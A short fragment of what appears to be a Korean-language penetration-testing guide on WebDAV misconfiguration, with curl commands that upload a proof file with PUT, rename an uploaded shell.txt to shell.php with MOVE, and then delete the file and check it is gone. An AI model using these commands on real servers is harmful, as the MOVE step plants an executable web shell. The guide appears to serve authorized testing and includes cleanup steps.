...
curl -X PUT --data-binary @proof.txt http://<TARGET>/<PATH>/proof.txt
curl http://<TARGET>/<PATH>/proof.txt
```
...
```bash
curl -X MOVE -H "Destination: http://<TARGET>/<PATH>/shell.php" http://<TARGET>/<PATH>/shell.txt
```
...
업로드 전 대상 URL에 같은 이름이 없는지 확인하고 `<UNIQUE_PROOF>`를 사용한다. `MOVE`를 사용했다면 원래 이름이 아니라 최종 destination을 제거한다.

```bash
curl -i -X DELETE http://<TARGET>/<PATH>/<UNIQUE_PROOF>.txt
curl -I http://<TARGET>/<PATH>/<UNIQUE_PROOF>.txt
```

확인할 출력:

- `DELETE` 성공 뒤 `GET` 또는 `HEAD`에서 파일이 더 이상 조회되지 않는다.
